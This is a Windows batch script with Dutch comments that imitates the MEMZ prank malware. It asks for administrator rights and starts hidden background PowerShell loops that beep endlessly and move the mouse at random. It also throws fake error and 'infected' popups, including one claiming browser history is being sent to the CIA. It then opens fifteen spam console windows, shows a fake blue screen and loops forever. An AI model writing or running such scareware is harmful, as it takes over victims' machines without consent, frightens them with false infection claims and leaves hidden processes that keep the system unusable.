@echo off
title MEMZ TRUE POPUP STORM - UNSTOPPABLE
color 0C
cls
setlocal enabledelayedexpansion

:: --- ADMIN CHECK & RESTART MET ADMIN ---
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo Bezig met aanvragen van administratorrechten...
    powershell -Command "Start-Process -FilePath '%~f0' -Verb runAs"
    exit /b
)

:: --- START CHAOTISCH PEEP GELUID (POWERHELL IN ACHTERGROND) ---
start "" powershell -WindowStyle Hidden -Command ^
"while ($true) { $freq = Get-Random -Minimum 600 -Maximum 1200; [console]::beep($freq, 200); Start-Sleep -Milliseconds 500 }" >nul 2>&1

:: --- CHAOTISCH BEWEGENDE MUIS ---
start "" powershell -WindowStyle Hidden -Command ^
"Add-Type -AssemblyName System.Windows.Forms; while ($true) { [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point((Get-Random -Minimum 0 -Maximum ([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width)), (Get-Random -Minimum 0 -Maximum ([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height))); Start-Sleep -Milliseconds 100 }" >nul 2>&1

:: --- POPUPS TEKENEN DIE BLIJVEN OPENSTAAN ---
set msgs[0]=Windows cannot find the file: memz.exe|Windows Error|0|16
set msgs[1]=Your system is now infected with MEMZ!|MEMZ|0|48
set msgs[2]=Error 0xDEADBEEF: System file corrupted|Critical System Error|0|16
set msgs[3]=Installing Clippy 2025 AI assistant...|Installation|0|64
set msgs[4]=Uploading your browser history to the CIA...|Warning|0|48
set msgs[5]=Disk read failure at sector 0x0BADF00D|System Alert|0|16
set msgs[6]=MEMZ has modified your host files|System Warning|0|48
set msgs[7]=Launching chaos module...|MEMZ Engine|0|32
set msgs[8]=Fatal exception at 0x7FFFFFFF|Fatal Error|0|16

for /L %%i in (0,1,8) do (
    for /F "tokens=1-4 delims=|" %%a in ("!msgs[%%i]!") do (
        start "" powershell -NoProfile -Command ^
        "Add-Type -AssemblyName PresentationFramework; [System.Windows.MessageBox]::Show('%%a','%%b',%%c,%%d)"
    )
    timeout /t 1 >nul
)

:: --- CMD VENSTERS MET FAKE ERRORS (SPAM) ---
set spamScript=%temp%\memz_spam.cmd
(
echo @echo off
echo setlocal enabledelayedexpansion
echo set chars=ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%%^&*()_+=
echo set glitchLength=40
echo for /L %%n in (1,1,60) do (
echo     set glitchText=
echo     for /L %%i in (1,1,!glitchLength!) do (
echo         set /A idx=!random! %% 40
echo         for /F "tokens=1 delims= " %%c in ("!chars:~!idx!,1!") do set glitchText=!glitchText!%%c
echo     )
echo     echo [MEMZ] Fatal error 0xDEADBEEF at sector %%n ^| !glitchText!
echo     timeout /t 1 >nul
echo )
echo pause
) > "%spamScript%"

for /L %%i in (1,1,15) do (
    start "" cmd /k "%spamScript%"
)

:: --- GLITCHY TERMINAL OUTPUT IN HOOFDVENSTER ---
cls
for /L %%g in (1,1,60) do (
    echo %%g ^#@!$%%&*()_+= MEMZ.EXE glitch error %%g []~~~
    ping 127.0.0.1 -n 1 >nul
)

:: --- KNIPPERENDE KLEUREN ---
for /L %%c in (1,1,10) do (
    color 0C
    ping 127.0.0.1 -n 1 >nul
    color 0A
    ping 127.0.0.1 -n 1 >nul
    color 0E
    ping 127.0.0.1 -n 1 >nul
)

:: --- FAKE BSOD ---
cls
color 1F
echo A problem has been detected and Windows has been shut down to prevent damage.
echo.
echo *** STOP: 0x000000DEAD (0xDEADBEEF, 0xBAADF00D, 0xFEE1DEAD)
echo Dumping physical memory to disk: 100%%
ping 127.0.0.1 -n 6 >nul

:: --- CHAOS LOOP MET FLICKEREN ---
:loop
set /A randColor=!random! %% 9 + 1
color 0!randColor!

set /A blankLines=!random! %% 5 + 1
for /L %%x in (1,1,!blankLines!) do echo.

echo [MEMZ] System is unstable... Press CTRL+C to quit.
ping 127.0.0.1 -n 2 >nul
goto loop
